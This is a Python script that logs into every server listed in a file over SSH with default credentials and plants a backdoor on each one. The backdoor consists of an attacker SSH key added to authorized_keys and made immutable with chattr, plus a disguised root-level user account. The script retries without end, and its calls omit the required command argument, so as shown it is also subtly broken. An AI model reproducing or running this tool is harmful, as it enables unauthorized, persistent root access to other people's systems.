import os
import sys
import paramiko
import time
import traceback
import select
import threading

PORT = 22
USERNAME1 = "<default username>"
PASSWORD1 = "<default password>"
USERNAME2 = "<default username>"
PASSWORD2 = "<default password>"
KEY = 'ssh-rsa <enter your key here>'
OUTLOCK = threading.Lock()
SSH_COMMAND = "sudo echo '%s' >> ~/.ssh/authorized_keys \n" \
              " sudo chattr +i ~/.ssh/authorized_keys \n" \
              "sudo useradd -ou 0 -g 0 <Enter unsuspecting Username> \n" \
              "sudo echo '<Enter Password>' | passwd <Enter unsuspecting Username> --stdin" % KEY


def ssh_connect_execute(host, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print ("Connecting to %s..." % host)
        ssh.connect(host, port, username, password)
        stdin, stdout, stderr = ssh.exec_command(command)
        with OUTLOCK:
            print ("Connected to %s" % host)
            os.system('echo "%s" >> successful' % host)
            print (stdout.readlines())
        sys.exit()
    except paramiko.AuthenticationException:
        print ("Authentication failed when connecting to host %s" % host)
    except Exception:
        print ("Port not opened or unreachable for %s" % host)
        os.system('echo "%s" >> failed' % host)
        sys.exit()

    return False


def workon(host):

    while True:
        connection = ssh_connect_execute(host=host,
                                         port=PORT,
                                         username=USERNAME1,
                                         password=PASSWORD1)
        if not connection:
            print ("Trying again with different credentials.")
            connection = ssh_connect_execute(host=host,
                                             port=PORT,
                                             username=USERNAME2,
                                             password=PASSWORD2)
        if not connection:
            os.system('echo "%s" >> failed' % host)
            print("Trying agin after 1 minute")
            time.sleep(60)


def main():
    threads = []
    for h in open('serveripaddr.txt'):
        h = h.rstrip()
        t = threading.Thread(target=workon, args=(h,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
